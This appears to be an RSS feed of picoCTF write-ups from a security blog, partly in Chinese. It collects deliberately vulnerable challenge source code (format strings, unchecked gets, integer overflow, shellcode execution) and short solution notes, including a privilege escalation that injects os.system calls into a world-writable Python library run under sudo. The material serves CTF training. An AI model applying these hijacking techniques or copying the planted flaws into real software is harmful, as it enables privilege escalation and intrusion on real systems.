Exploit - Extract File &amp; Decrypt Follow TCP Packets Hey, how do you decrypt this file again? You're serious? Yeah, I'm serious *sigh* openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123 Ok, great, thanks. Let's use Discord next time, it's more secure. C'mon, no one knows we use this program like this! Whatever. Hey. Yeah? Could you transfer the file to me again? Oh great. Ok, over 9002? Yeah, listening. Sent it Got it. You're unbelievable 從以上對話紀錄可以知道他們在9002 port有傳輸資料，並且解密的command是openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123 Extract File 我們可以增加兩個column專門顯示source/destination port 然後找到port 9002的地方，可以發現No.57有附帶資料，把這筆資料另存起來 Note: 儲存資料到file.des3的時候，內容必須要是Salted__9BæÄ'÷b4Ó[ÐNXämn±'-ärGsðÏú :›çk¿«@Û=6 Note2: 也可以用tcpflow的方式把資料download下來 $ sudo tcpflow -r {pcap file} Decrypt File $ openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123 *** WARNING : deprecated key derivation used. Using -iter or -pbkdf2 would be better. Flag: picoCTF{nc_73115_411_dd54ab67}</description></item><item><title>PicoCTF - fermat-strings</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---fermat-strings/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---fermat-strings/index.html</guid><description>PicoCTF - fermat-strings Background C 庫函數 - strcspn()
該函數返回 str1 開頭連續都不含字符串 str2 中字符的字符數。
atoi() - C語言庫函數
這個函數返回一個int值轉換的整數。如果冇有有效的轉換可以執行，它返回零。
C 库函数 - snprintf()
snprintf() 函數的返回值是輸出到 str 緩沖區中的字符數，不包括字符串結尾的空字符 \0。如果 snprintf() 輸出的字符數超過了 size 參數指定的緩沖區大小，則輸出的結果會被截斷，只有 size - 1 個字符被寫入緩沖區，最後一個字符為字符串結尾的空字符 \0。
需要注意的是，snprintf() 函數返回的字符數並不包括字符串結尾的空字符 \0，因此如果需要將輸出結果作為一個字符串使用，則需要在緩沖區的末尾添加一個空字符 \0。
Format Specifiers in C
Source code :::spoiler
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;math.h> #define SIZE 0x100 int main(void) { char A[SIZE]; char B[SIZE]; int a = 0; int b = 0; puts("Welcome to Fermat\\'s Last Theorem as a service"); setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); printf("A: "); read(0, A, SIZE); printf("B: "); read(0, B, SIZE); A[strcspn(A, "\n")] = 0; B[strcspn(B, "\n")] = 0; a = atoi(A); b = atoi(B); if(a == 0 || b == 0) { puts("Error: could not parse numbers!"); return 1; } char buffer[SIZE]; snprintf(buffer, SIZE, "Calculating for A: %s and B: %s\n", A, B); printf(buffer); int answer = -1; for(int i = 0; i &lt; 100; i++) { if(pow(a, 3) + pow(b, 3) == pow(i, 3)) { answer = i; } } if(answer != -1) printf("Found the answer: %d\n", answer); } :::</description></item><item><title>PicoCTF - File types</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---file-types/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---file-types/index.html</guid><description>PicoCTF - File types tags: PicoCTF CTF Misc Challenge: File types
Background For Shell Script Linux MD5 Linux egrep命令 Shell test 命令
-f 文件名: 如果文件存在且为普通文件则为真
How to modify $PATH touch - time stamp What is $$ in bash?
For Compress Command Linux 備份檔案操作 cpio 指令教學與範例 bzip2 command in Linux Gzip Command in Linux Lzip Manual lz4 manual lzma manual lzop(1) - Linux man page
Source code :::spoiler Flag.pdf
#!/bin/sh # This is a shell archive (produced by GNU sharutils 4.15.2). # To extract the files from this archive, save it to some FILE, remove # everything before the '#!/bin/sh' line above, then type 'sh FILE'. # lock_dir=_sh00046 # Made on 2022-03-15 06:50 UTC by &lt;root@e8647f66bc56>. # Source directory was '/app'. # # Existing files will *not* be overwritten, unless '-c' is specified. # # This shar contains: # length mode name # ------ ---------- ------------------------------------------ # 1092 -rw-r--r-- flag # MD5SUM=${MD5SUM-md5sum} f=`${MD5SUM} --version | egrep '^md5sum .*(core|text)utils'` test -n "${f}" &amp;&amp; md5check=true || md5check=false ${md5check} || \ echo 'Note: not verifying md5sums. Consider installing GNU coreutils.' if test "X$1" = "X-c" then keep_file='' else keep_file=true fi echo=echo save_IFS="${IFS}" IFS="${IFS}:" gettext_dir= locale_dir= set_echo=false for dir in $PATH do if test -f $dir/gettext \ &amp;&amp; ($dir/gettext --version >/dev/null 2>&amp;1) then case `$dir/gettext --version 2>&amp;1 | sed 1q` in *GNU*) gettext_dir=$dir set_echo=true break ;; esac fi done if ${set_echo} then set_echo=false for dir in $PATH do if test -f $dir/shar \ &amp;&amp; ($dir/shar --print-text-domain-dir >/dev/null 2>&amp;1) then locale_dir=`$dir/shar --print-text-domain-dir` set_echo=true break fi done if ${set_echo} then TEXTDOMAINDIR=$locale_dir export TEXTDOMAINDIR TEXTDOMAIN=sharutils export TEXTDOMAIN echo="$gettext_dir/gettext -s" fi fi IFS="$save_IFS" if (echo "testing\c"; echo 1,2,3) | grep c >/dev/null then if (echo -n test; echo 1,2,3) | grep n >/dev/null then shar_n= shar_c=' ' else shar_n=-n shar_c= ; fi else shar_n= shar_c='\c' ; fi f=shar-touch.$$ st1=200112312359.59 st2=123123592001.59 st2tr=123123592001.5 # old SysV 14-char limit st3=1231235901 if touch -am -t ${st1} ${f} >/dev/null 2>&amp;1 &amp;&amp; \ test ! -f ${st1} &amp;&amp; test -f ${f}; then shar_touch='touch -am -t $1$2$3$4$5$6.$7 "$8"' elif touch -am ${st2} ${f} >/dev/null 2>&amp;1 &amp;&amp; \ test ! -f ${st2} &amp;&amp; test ! -f ${st2tr} &amp;&amp; test -f ${f}; then shar_touch='touch -am $3$4$5$6$1$2.$7 "$8"' elif touch -am ${st3} ${f} >/dev/null 2>&amp;1 &amp;&amp; \ test ! -f ${st3} &amp;&amp; test -f ${f}; then shar_touch='touch -am $3$4$5$6$2 "$8"' else shar_touch=: echo ${echo} 'WARNING: not restoring timestamps. Consider getting and installing GNU '\''touch'\'', distributed in GNU coreutils...' echo fi rm -f ${st1} ${st2} ${st2tr} ${st3} ${f} # if test ! -d ${lock_dir} ; then : else ${echo} "lock directory ${lock_dir} exists" exit 1 fi if mkdir ${lock_dir} then ${echo} "x - created lock directory ${lock_dir}." else ${echo} "x - failed to create lock directory ${lock_dir}." exit 1 fi # ============= flag ============== if test -n "${keep_file}" &amp;&amp; test -f 'flag' then ${echo} "x - SKIPPING flag (file already exists)" else ${echo} "x - extracting flag (text)" sed 's/^X//' &lt;&lt; 'SHAR_EOF' | uudecode &amp;&amp; begin 600 flag M(3QA&lt;F-H/@IF;&amp;%G+R`@("`@("`@("`@,"`@("`@("`@("`@,"`@("`@,"`@ M("`@-C0T("`@("`Q,#(T("`@("`@8`K'&lt;6D`&amp;[RD@0`````!````,&amp;(\-P4` M``#_`69L86&lt;``$)::#DQ05DF4UG8%@C,```E___[Y[M[G]GO[=^W[_N__^6^ MYJGOD+YKS[D]VU]`>Q]/?;`!&amp;;"0&amp;@:`!H:`T:9-`#3330T:::`!H-'J:``8 MC0:!H,C1HR#1HR,C)ZFFCU-'E'J8T:AR`Q#1B`-`&amp;3330`80:`!B,!,1DT-` M`#$&amp;1ID9#!,@R::&amp;$PAHR#3"JGZ4R,C1HTT#U&amp;(80#1H`9,C1ZF0Q`9``>H` M!D````]3$`,F(`T&amp;AHT!`$`-$2N?R0*H(%R04*&lt;D(7$`\"P"6J(/ORS5EV'E MY1A`\T1>[HJ%R[CD]7UCS7E.#93IHR*#^?R7/$W6*1]HGQ=6EJ_/A$B_2&lt;_G M5]3/.*(B)V8P\40AS.5X&lt;KE?9IM4'Q&lt;3&amp;PH+K"FJ)I6/1XOFW@W&lt;,00&lt;]B>2 MPX5/>V_P:DLC2^>A1^[>Y#?DS"9KG7[]/=&lt;ASJ7MJ$$R&amp;\`6.9W")P6VS9LD M.F7L4"\Y$H\1@O$:/N]]&lt;+E+8B9)"'%;)PX-A@F\-3%=ICS(%E2AC+#,!8,&lt; MZ%O`&lt;_HMM@M%6#]!6"7]`2W:!\.3@RYX$/2&amp;/(\:I$&lt;N@*34)6G+(BNGHY5V M0T)XU&amp;!)Q5B-(=%VD-NN'6ZZ(BF`XC3PJ\R/QN6:)#XCNK?X%$*H>1Z(HQ>C M#5HSE`/XJAZ-J?*((R/%CB[DBG"A(;`L$9@`QW$``````````````0`````` M```+``````!44D%)3$52(2$A```````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` M```````````````````````````````````````````````````````````` ,```````````````` ` end SHAR_EOF (set 20 22 03 15 06 50 36 'flag' eval "${shar_touch}") &amp;&amp; \ chmod 0644 'flag' if test $? -ne 0 then ${echo} "restore of flag failed" fi if ${md5check} then ( ${MD5SUM} -c >/dev/null 2>&amp;1 || ${echo} 'flag': 'MD5 check failed' ) &lt;&lt; \SHAR_EOF b5cc2c5756410f2467168f6d4c468f52 flag SHAR_EOF else test `LC_ALL=C wc -c &lt; 'flag'` -ne 1092 &amp;&amp; \ ${echo} "restoration warning: size of 'flag' is not 1092" fi fi if rm -fr ${lock_dir} then ${echo} "x - removed lock directory ${lock_dir}." else ${echo} "x - failed to remove lock directory ${lock_dir}." exit 1 fi exit 0 :::</description></item><item><title>PicoCTF - filtered-shellcode</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---filtered-shellcode/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---filtered-shellcode/index.html</guid><description>PicoCTF - filtered-shellcode Background Shell Code Reverse
Source code :::spoiler Source Code Got From Server After Get Shell
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #define MAX_LENGTH 1000 void execute(char *shellcode, size_t length) { if (!shellcode || !length) { exit(1); } size_t new_length = length * 2; char result[new_length + 1]; int spot = 0; for (int i = 0; i &lt; new_length; i++) { if ((i % 4) &lt; 2) { result[i] = shellcode[spot++]; } else { result[i] = '\x90'; } } // result[new_length] = '\xcc'; result[new_length] = '\xc3'; // Execute code int (*code)() = (int(*)())result; code(); } int main(int argc, char *argv[]) { setbuf(stdout, NULL); char buf[MAX_LENGTH]; size_t length = 0; char c = '\0'; printf("Give me code to run:\n"); c = fgetc(stdin); while ((c != '\n') &amp;&amp; (length &lt; MAX_LENGTH)) { buf[length] = c; c = fgetc(stdin); length++; } if (length % 2) { buf[length] = '\x90'; length++; } execute(buf, length); return 0; } :::</description></item><item><title>PicoCTF - flag leak</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---flag-leak/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---flag-leak/index.html</guid><description>PicoCTF - flag leak Background Format String Bug Source code :::spoiler
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;wchar.h> #include &lt;locale.h> #define BUFSIZE 64 #define FLAGSIZE 64 void readflag(char* buf, size_t len) { FILE *f = fopen("flag.txt","r"); if (f == NULL) { printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n"); exit(0); } fgets(buf,len,f); // size bound read } void vuln(){ char flag[BUFSIZE]; char story[128]; readflag(flag, FLAGSIZE); printf("Tell me a story and then I'll tell you one >> "); scanf("%127s", story); printf("Here's a story - \n"); printf(story); printf("\n"); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); return 0; } :::</description></item><item><title>PicoCTF - flag_shop</title><link>https://bernie6401.github.io/security/practice/picoctf/general-skills/picoctf---flag_shop/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/general-skills/picoctf---flag_shop/index.html</guid><description>PicoCTF - flag_shop tags: PicoCTF CTF General Skill Background Bof
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> int main() { setbuf(stdout, NULL); int con; con = 0; int account_balance = 1100; while(con == 0){ printf("Welcome to the flag exchange\n"); printf("We sell flags\n"); printf("\n1. Check Account Balance\n"); printf("\n2. Buy Flags\n"); printf("\n3. Exit\n"); int menu; printf("\n Enter a menu selection\n"); fflush(stdin); scanf("%d", &amp;menu); if(menu == 1){ printf("\n\n\n Balance: %d \n\n\n", account_balance); } else if(menu == 2){ printf("Currently for sale\n"); printf("1. Defintely not the flag Flag\n"); printf("2. 1337 Flag\n"); int auction_choice; fflush(stdin); scanf("%d", &amp;auction_choice); if(auction_choice == 1){ printf("These knockoff Flags cost 900 each, enter desired quantity\n"); int number_flags = 0; fflush(stdin); scanf("%d", &amp;number_flags); if(number_flags > 0){ int total_cost = 0; total_cost = 900*number_flags; printf("\nThe final cost is: %d\n", total_cost); if(total_cost &lt;= account_balance){ account_balance = account_balance - total_cost; printf("\nYour current balance after transaction: %d\n\n", account_balance); } else{ printf("Not enough funds to complete purchase\n"); } } } else if(auction_choice == 2){ printf("1337 flags cost 100000 dollars, and we only have 1 in stock\n"); printf("Enter 1 to buy one"); int bid = 0; fflush(stdin); scanf("%d", &amp;bid); if(bid == 1){ if(account_balance > 100000){ FILE *f = fopen("flag.txt", "r"); if(f == NULL){ printf("flag not found: please run this on the server\n"); exit(0); } char buf[64]; fgets(buf, 63, f); printf("YOUR FLAG IS: %s\n", buf); } else{ printf("\nNot enough funds for transaction\n\n\n"); }} } } else{ con = 1; } } return 0; } :::</description></item><item><title>PicoCTF - Forky</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---forky/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---forky/index.html</guid><description>PicoCTF - Forky Background fork用法與範例 Source code Main Function From IDA
int __cdecl main(int argc, const char **argv, const char **envp) { _DWORD *v4; // [esp+8h] [ebp-Ch] v4 = mmap(0, 4u, 3, 33, -1, 0); *v4 = 1000000000; fork(); fork(); fork(); fork(); *v4 += 1234567890; doNothing(*v4); return 0; } Recon 這一題很有趣，有了background之後其實對這一題的想法差不多就和1差不多，也就是parent process fork出child process後會繼續往下fork出grandchild process，直到parent process執行完成
+ | +-----------------------------------+ | | +-----------------+ +-----------------+ | | | | +--------+ +--------+ +--------+ +--------+ | | | | | | | | +---+ +---+ +---+ +---+ +---+ +---+ +---+ +---+ | | | | | | | | | | | | | | | | O O O O O O O O O O O O O O O O 而且他們所操作的外部記憶體對象都會是一樣的，代表*v4最終會被加16次，只是我沒有考慮到負號的問題，因為該題是32bits，代表加到一定程度會overflow，所以都沒解出來</description></item><item><title>PicoCTF - function overwrite</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---function-overwrite/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---function-overwrite/index.html</guid><description>PicoCTF - function overwrite Background Array Bound
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;wchar.h> #include &lt;locale.h> #define BUFSIZE 64 #define FLAGSIZE 64 int calculate_story_score(char *story, size_t len) { int score = 0; for (size_t i = 0; i &lt; len; i++) { score += story[i]; } return score; } void easy_checker(char *story, size_t len) { if (calculate_story_score(story, len) == 1337) { char buf[FLAGSIZE] = {0}; FILE *f = fopen("flag.txt", "r"); if (f == NULL) { printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n"); exit(0); } fgets(buf, FLAGSIZE, f); // size bound read printf("You're 1337. Here's the flag.\n"); printf("%s\n", buf); } else { printf("You've failed this class."); } } void hard_checker(char *story, size_t len) { if (calculate_story_score(story, len) == 13371337) { char buf[FLAGSIZE] = {0}; FILE *f = fopen("flag.txt", "r"); if (f == NULL) { printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n"); exit(0); } fgets(buf, FLAGSIZE, f); // size bound read printf("You're 13371337. Here's the flag.\n"); printf("%s\n", buf); } else { printf("You've failed this class."); } } void (*check)(char*, size_t) = hard_checker; int fun[10] = {0}; void vuln() { char story[128]; int num1, num2; printf("Tell me a story and then I'll tell you if you're a 1337 >> "); scanf("%127s", story); printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n"); scanf("%d %d", &amp;num1, &amp;num2); if (num1 &lt; 10) { fun[num1] += num2; } check(story, strlen(story)); } int main(int argc, char **argv) { setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); return 0; } :::</description></item><item><title>PicoCTF - gogo</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---gogo/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---gogo/index.html</guid><description>PicoCTF - gogo Source code :::spoiler IDA Main Function
// main.main void __cdecl main_main() { _slice_interface_ typ[2]; // [esp+0h] [ebp-58h] BYREF string *second_flag; // [esp+20h] [ebp-38h] string *flag; // [esp+24h] [ebp-34h] _slice_interface_ v3; // [esp+28h] [ebp-30h] BYREF string *v4; // [esp+34h] [ebp-24h] _DWORD v5[2]; // [esp+38h] [ebp-20h] BYREF _DWORD v6[2]; // [esp+40h] [ebp-18h] BYREF _slice_interface_ v7; // [esp+48h] [ebp-10h] BYREF string *v8; // [esp+54h] [ebp-4h] flag = runtime_newobject(&amp;RTYPE_string_0); typ[0].array = "Enter Password: "; typ[0].len = 16; memset(&amp;typ[0].cap, 0, sizeof(_slice_interface_)); fmt_Printf(*&amp;typ[0].array, *&amp;typ[0].cap); v6[0] = &amp;RTYPE__ptr_string; v6[1] = flag; typ[0].array = "%s\n"; typ[0].len = 3; typ[0].cap = v6; *&amp;typ[1].array = 0x100000001LL; fmt_Scanf(*&amp;typ[0].array, *&amp;typ[0].cap); if ( main_checkPassword(*flag) ) { v5[0] = &amp;RTYPE_string_0; v5[1] = &amp;main_statictmp_0; typ[0].array = v5; *&amp;typ[0].len = 0x100000001LL; fmt_Println(typ[0]); v3.cap = &amp;RTYPE_string_0; v4 = &amp;main_statictmp_1; typ[0].array = &amp;v3.cap; *&amp;typ[0].len = 0x100000001LL; fmt_Println(typ[0]); v3.array = &amp;RTYPE_string_0; v3.len = &amp;main_statictmp_2; typ[0].array = &amp;v3; *&amp;typ[0].len = 0x100000001LL; fmt_Println(typ[0]); second_flag = runtime_newobject(&amp;RTYPE_string_0); v7.cap = &amp;RTYPE__ptr_string; v8 = second_flag; typ[0].array = "%s\n"; typ[0].len = 3; typ[0].cap = &amp;v7.cap; *&amp;typ[1].array = 0x100000001LL; fmt_Scanf(*&amp;typ[0].array, *&amp;typ[0].cap); main_ambush(*second_flag); runtime_deferproc(0, &amp;stru_81046A0); } else { v7.array = &amp;RTYPE_string_0; v7.len = &amp;main_statictmp_3; typ[0].array = &amp;v7; *&amp;typ[0].len = 0x100000001LL; fmt_Println(typ[0]); } runtime_deferreturn(typ[0].array); } :::</description></item><item><title>PicoCTF - Guessing Game 1</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---guessing-game-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---guessing-game-1/index.html</guid><description>PicoCTF - Guessing Game 1 Background ROP Chain Linux System Call Table for x86 64
Source code :::spoiler
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;sys/stat.h> #define BUFSIZE 100 long increment(long in) { return in + 1; } long get_random() { return rand() % BUFSIZE; } int do_stuff() { long ans = get_random(); ans = increment(ans); int res = 0; printf("What number would you like to guess?\n"); char guess[BUFSIZE]; fgets(guess, BUFSIZE, stdin); long g = atol(guess); if (!g) { printf("That's not a valid number!\n"); } else { if (g == ans) { printf("Congrats! You win! Your prize is this print statement!\n\n"); res = 1; } else { printf("Nope!\n\n"); } } return res; } void win() { char winner[BUFSIZE]; printf("New winner!\nName? "); fgets(winner, 360, stdin); printf("Congrats %s\n\n", winner); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); int res; printf("Welcome to my guessing game!\n\n"); while (1) { res = do_stuff(); if (res) { win(); } } return 0; } :::</description></item><item><title>PicoCTF - Guessing Game 2</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---guessing-game-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---guessing-game-2/index.html</guid><description>PicoCTF - Guessing Game 2 Background fmt / leak libc / ret2libc / leak canary
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;sys/stat.h> #define BUFSIZE 512 long get_random() { return rand; } int get_version() { return 2; } // void print(long n) // { // // If number is smaller than 0, put a - sign // // and change number to positive // if (n &lt; 0) { // putchar('-'); // n = -n; // } // // Remove the last digit and recur // if (n/10) // print(n/10); // // Print the last digit // putchar(n%10 + '0'); // } int do_stuff() { long ans = (get_random() % 4096) + 1; // print(ans); int res = 0; printf("What number would you like to guess?\n"); char guess[BUFSIZE]; fgets(guess, BUFSIZE, stdin); long g = atol(guess); if (!g) { printf("That's not a valid number!\n"); } else { if (g == ans) { printf("Congrats! You win! Your prize is this print statement!\n\n"); res = 1; } else { printf("Nope!\n\n"); } } return res; } void win() { char winner[BUFSIZE]; printf("New winner!\nName? "); gets(winner); printf("Congrats: "); printf(winner); printf("\n\n"); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); int res; printf("Welcome to my guessing game!\n"); printf("Version: %x\n\n", get_version()); while (1) { res = do_stuff(); if (res) { win(); } } return 0; } :::</description></item><item><title>PicoCTF - hijacking</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---hijacking/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---hijacking/index.html</guid><description>PicoCTF - hijacking Background Privilege Escalation
Hint 1: Check for Hidden files Hint 2: No place like Home:)
Linux sudo命令
-l 顯示出自己（執行 sudo 的使用者）的權限
Recon 第一次遇到提權的問題，感覺很新鮮也很好玩，不過因為沒啥概念所以主要是參考1
首先觀察一下各個file或folders，根目錄有個challenge folder，另外家目錄有一個.server.py檔案，裡面的內容不太重要，只需要知道他import哪些library 現在的問題是按照目前的權限，無法讀取challenge相關的資訊，所以我們要提升權限，主要的做法是利用base64.py這個mod全開的檔案進行讀寫，再利用python執行有import base64的.server.py檔案就可以執行shell 為神麼要用base64.py當作主要的突破口就是因為只有他的mod全開 $ ls -al /usr/lib/python3.8 ... -rwxrwxrwx 1 root root 20382 Nov 14 2022 base64.py ... -rw-r--r-- 1 root root 38995 Nov 14 2022 os.py ... -rw-r--r-- 1 root root 35243 Nov 14 2022 socket.py Exploit $ ssh picoctf@saturn.picoctf.net -p 58219 $ find / -name "base64.py" ... /usr/lib/python3.8/base64.py ... $ vim /usr/lib/python3.8/base64.py # add these line and save the file import os os.system('ls -al /challenge') $ sudo -l Matching Defaults entries for picoctf on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User picoctf may run the following commands on challenge: (ALL) /usr/bin/vi (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py $ sudo /usr/bin/python3 /home/picoctf/.server.py total 4 d--------- 1 root root 6 Mar 16 02:08 . drwxr-xr-x 1 root root 51 Jul 31 15:23 .. -rw-r--r-- 1 root root 103 Mar 16 02:08 metadata.json sh: 1: ping: not found Traceback (most recent call last): File "/home/picoctf/.server.py", line 7, in &lt;module> host_info = socket.gethostbyaddr(ip) socket.gaierror: [Errno -5] No address associated with hostname $ vim /usr/lib/python3.8/base64.py # revise the file os.system('cat /challegne/metadata.json') $ sudo /usr/bin/python3 /home/picoctf/.server.py {"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}", "username": "picoctf", "password": "HYGhWsmPyf"}sh: 1: ping: not found Traceback (most recent call last): File "/home/picoctf/.server.py", line 7, in &lt;module> host_info = socket.gethostbyaddr(ip) socket.gaierror: [Errno -5] No address associated with hostname Flag: picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}</description></item><item><title>PicoCTF - information</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/picoctf---information/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/picoctf---information/index.html</guid><description>PicoCTF - information tags: PicoCTF CTF Misc Challenge: https://play.picoctf.org/practice/challenge/186?category=4&amp;page=1
Background ExifTool
Exploit $ exiftool cat.jpg ExifTool Version Number : 11.88 File Name : cat.jpg Directory : . File Size : 858 kB File Modification Date/Time : 2023:02:16 02:15:29+08:00 File Access Date/Time : 2023:02:16 16:09:51+08:00 File Inode Change Date/Time : 2023:02:16 12:31:32+08:00 File Permissions : rwxrwxrwx File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.02 Resolution Unit : None X Resolution : 1 Y Resolution : 1 Current IPTC Digest : 7a78f3d9cfb1ce42ab5a3aa30573d617 Copyright Notice : PicoCTF Application Record Version : 4 XMP Toolkit : Image::ExifTool 10.80 License : cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9 Rights : PicoCTF Image Width : 2560 Image Height : 1598 Encoding Process : Baseline DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Image Size : 2560x1598 Megapixels : 4.1 In License row, it’s obviously a base64 encoding string picoCTF{the_m3tadata_1s_modified}</description></item><item><title>PicoCTF - Insp3ct0r</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---insp3ct0r/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---insp3ct0r/index.html</guid><description>PicoCTF - Insp3ct0r tags: PicoCTF CTF Web Challenge: Insp3ct0r
Source code Exploit - Browser Inspector HTML
&lt;!doctype html> &lt;html> &lt;head> &lt;title>My First Website :)&lt;/title> &lt;link href="https://fonts.googleapis.com/css?family=Open+Sans|Roboto" rel="stylesheet"> &lt;link rel="stylesheet" type="text/css" href="mycss.css"> &lt;script type="application/javascript" src="myjs.js">&lt;/script> &lt;/head> &lt;body> &lt;div class="container"> &lt;header> &lt;h1>Inspect Me&lt;/h1> &lt;/header> &lt;button class="tablink" onclick="openTab('tabintro', this, '#222')" id="defaultOpen">What&lt;/button> &lt;button class="tablink" onclick="openTab('tababout', this, '#222')">How&lt;/button> &lt;div id="tabintro" class="tabcontent"> &lt;h3>What&lt;/h3> &lt;p>I made a website&lt;/p> &lt;/div> &lt;div id="tababout" class="tabcontent"> &lt;h3>How&lt;/h3> &lt;p>I used these to make this site: &lt;br/> HTML &lt;br/> CSS &lt;br/> JS (JavaScript) &lt;/p> &lt;!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 --> &lt;/div> &lt;/div> &lt;/body> &lt;/html> CSS Download it and search specific string</description></item><item><title>PicoCTF - Investigative Reversing 0</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---investigative-reversing-0/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---investigative-reversing-0/index.html</guid><description>PicoCTF - Investigative Reversing 0 tags: PicoCTF CTF Misc Challenge: Investigative Reversing 0
Background fputc() - C語言庫函數 C/C++ fread 用法與範例 C中fread()函数的返回值 C语言之1ULL/1UL/1L区别
Source code - IDA :::spoiler source code
